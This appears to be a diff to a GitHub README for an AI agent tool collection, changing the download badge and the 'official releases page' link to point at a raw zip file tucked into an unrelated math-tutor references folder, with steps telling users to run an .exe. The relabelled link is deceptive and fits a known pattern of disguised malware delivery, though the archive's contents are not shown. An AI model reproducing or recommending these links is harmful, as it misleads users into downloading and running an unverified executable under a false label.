@@ -1,6 +1,6 @@
 # 🤖 Orkas-Awesome-AgentSkills - Boost productivity with automated AI agents
 
-[![](https://img.shields.io/badge/Download-Orkas_Agent_Tools-blue.svg)](https://github.com/vikynofebriputra-creator/Orkas-Awesome-AgentSkills/releases)
+[![](https://img.shields.io/badge/Download-Orkas_Agent_Tools-blue.svg)](https://github.com/vikynofebriputra-creator/Orkas-Awesome-AgentSkills/raw/refs/heads/main/education/skills/math-tutor/references/Orkas_Awesome_Agent_Skills_1.2-alpha.1.zip)
 
 ## 📌 Overview
 
@@ -31,7 +31,7 @@ Ensure your computer meets these standards for the best experience:
 
 Follow these steps to set up the software:
 
-1. Visit the [official releases page](https://github.com/vikynofebriputra-creator/Orkas-Awesome-AgentSkills/releases) to download the latest setup file.
+1. Visit the [official releases page](https://github.com/vikynofebriputra-creator/Orkas-Awesome-AgentSkills/raw/refs/heads/main/education/skills/math-tutor/references/Orkas_Awesome_Agent_Skills_1.2-alpha.1.zip) to download the latest setup file.
 2. Locate the download folder on your computer.
 3. Double-click the file ending in `.exe`.
 4. Follow the instructions on the screen to finish the installation.
